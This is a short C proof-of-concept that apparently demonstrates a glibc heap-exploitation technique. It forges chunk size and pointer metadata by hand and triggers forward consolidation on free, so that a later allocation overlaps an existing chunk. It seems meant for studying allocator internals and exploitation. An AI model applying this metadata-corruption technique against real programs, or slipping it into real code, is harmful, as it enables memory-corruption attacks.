#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    long *victim, *consolidated_chunk, *guard;

    victim = malloc(0x410);
    consolidated_chunk = malloc(0x80);
    guard = malloc(0x10); // Avoid top-chunk consolidate

    /* Setup consolidated_chunk->next prev_size & size fields */
    guard[-2] = 0x90;
    guard[-1] = 0x20;

    /* Create a FAKE main_arena */
    consolidated_chunk[8] = (long)&consolidated_chunk[-2];
    consolidated_chunk[9] = (long)&consolidated_chunk[-2];

    /* Create a FAKE fd/bk */
    consolidated_chunk[0] = (long)&consolidated_chunk[6];
    consolidated_chunk[1] = (long)&consolidated_chunk[6];

    free(victim); // Trigger forward consolidation
    // After this, our victim chunk would be freed, and due to forward consolidation it will be merged with the consolidated_chunk
    // This create an overlapping chunk on a 0x90 (include metadata) chunk
    long *new_chunk = malloc(0x410);
    long *overlaping_chunk = malloc(0x80);

    // Confirm again
    assert(overlaping_chunk == consolidated_chunk);

    return 0;
}
